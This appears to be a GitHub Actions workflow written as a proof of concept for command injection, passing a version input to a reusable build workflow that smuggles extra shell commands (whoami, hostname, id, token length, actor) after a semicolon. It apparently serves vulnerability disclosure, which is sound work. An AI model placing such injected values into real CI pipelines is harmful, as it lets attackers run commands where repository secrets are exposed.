name: "PoC — Workflow Injection (SAFE TEST)"

on:
  workflow_dispatch:

jobs:
  poc:
    uses: ./.github/workflows/build.yml
    with:
      stellar-cli-ref: "v27.0.0; whoami; hostname; id; echo GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}; echo ACTOR=$GITHUB_ACTOR; #"
